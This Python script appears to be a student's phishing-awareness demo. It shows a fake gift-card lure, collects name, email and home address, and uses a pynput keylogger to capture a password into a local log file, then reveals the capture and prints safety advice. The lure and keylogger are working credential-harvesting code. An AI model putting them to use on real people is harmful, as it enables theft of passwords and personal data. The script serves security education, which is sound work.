# Import required modules
import webbrowser
from pynput import keyboard #Keylogger
from module1 import banner# Edu banner and also for multi file thingy

# Global variables
user_data = []  # List to store user inputs
log_file = "user_input_log.txt"  #file it stores it to and that were gonna use to output
# im sorry for the mess
# Class 1: to handle key logging functionality
class KeyLogger:
    def __init__(self):
        self.keys = []
        self.count = 0
        self.max_count = 10  # Save after this many keystrokes
        self.final_password= ""# turns out I need this if not I guess it might not turn into string I think

    def on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            self.keys.append(f"[{key}]")
        self.count += 1
        if self.count >= self.max_count:
            self.save_keys()
            self.count = 0

    def on_release(self, key):
        # Stops key log after entering 
        if key == keyboard.Key.space:#space bar to close because enter breaks code
            self.keys = [k for k in self.keys if k != "[Key.space]"] # filter final key so it dosent show up in password
            self.final_password = "".join(self.keys) #saves captured info
            self.save_keys()
            return False

    def save_keys(self):
        try:
            with open(log_file, "a", encoding="utf-8") as file:# encoding utf-8 if not this thing refuses to work 
                for key in self.keys:
                    file.write(str(key))
                file.write("\n")# new line 
            self.keys = []
        except Exception as e:
            print(f"Error writing keys: (saving keys) {e}")
# Class 2: for the user input and also for the darn scary message
class UserPrompt:
    def __init__(self):
        self.prompts = [#prompts add more if you want might break though ngl
            "Congratulations! You've won a $1000 gift card!",# Keeping it a bit serious because for future 
            "Please enter your full name: ",
            "Enter your email address: ",
            "What is your home address?: "
        ]
        self.responses = {}

    def ask_questions(self):
        for prompt in self.prompts[1:]:
            response = input(prompt)
            self.responses[prompt] = response
            user_data.append(response)

    def display_warning(self):
        print("\n--- !!!WARNING!!! SECURITY NOTICE ---")
        print("This was a simulation Where you were asked for sensitive data.")
        print("Becareful where you input your information if this was a real scam your identity could have been stolen or used for malicious intent!")
        print("Always verify who you're sharing information with.")
        print("------------Stay safe online!-------")
        print("Never use the same password for every login.")
        print("Make sure the source is trusted and secure.")
        print("Dont share sensitive data online such as Credit card info or ssn's")
        print("Becareful online there is tons of risk and dangers on the internet. Stay safe secure and private.")
        print("Directed to a website that gives some online safety tips please consider the following!")
        webbrowser.open("https://www.staysafeonline.org/articles/online-safety-basics")

    def doorstopper(self):# this becasue for some reason the program window closses instantly 
        input("Press to close program")

class SecureWarning(UserPrompt):# sub class
    def __init__(self):
        super().__init__()
        self.data_saved = True

    def show_file_notice(self):
        if self.data_saved:
            print("\n !!!!!!!!!!! IMPORTANT NOTICE !!!!!!!!!!")
            print(" Beware the information that you input is still saved in a while thats written")
            print(" That file I believe dosent delete after codes done so make sure if any important infor is on it")
            print("!!!!!!!!!!! DELETE IT!!!!!!!!!!!!!!!!")
# Function to save collected user data to file
def save_user_data():
    try:
        with open(log_file, "a", encoding="utf-8") as f:# utf 8 encoding else it breaks
            f.write("\nCollected User Information:\n")
            for item in user_data:
                f.write(item + "\n")
    except Exception as e:
        print(f"Error saving user data:(saving userdata) {e}")

# Main function to coordinate the program like the conductor
def main():
    try:
        banner() #my little message
        prompt = SecureWarning()
        print(prompt.prompts[0])  #Show the bait 
        prompt.ask_questions()    # reel in the fish 
        save_user_data()          # Exfil

        print("\nEnter your password exactly in order to win your $1000 gift card!.(press space to continue no special characters)")# DO NOT PRESS ENTER OR THE WHOLE PROGRAM WILL KILL ITSELF FOR SOME REASON WHEN PRESSING THE CLOSE BUTTON .
        logger = KeyLogger()# Begin keylogging
        with keyboard.Listener(
            on_press=logger.on_press,
            on_release=logger.on_release
        ) as listener:
            listener.join()
        print("\nUser information that could have been stolen!:")
        for question, answer in prompt.responses.items():
            label = question.strip(": ").replace("What is your", "").replace("Please enter your", "").capitalize()
            print(f"{label}: {answer }")
        print(f"Password: {logger.final_password}", flush = True) # I just learn this but when io is still messing around it can buffer and reprint the logger stuff out when everything is done.
        prompt.display_warning()  # Show security warning
        prompt.show_file_notice()
        print(" \n", flush=True)
        prompt.doorstopper() # stops the program from closing immediately 
    except KeyboardInterrupt:
        print("Program interrupted by user.")
    except Exception as e:
        print(f"An error occurred: {e}")
# Runs the script
if __name__ == "__main__":
    main()
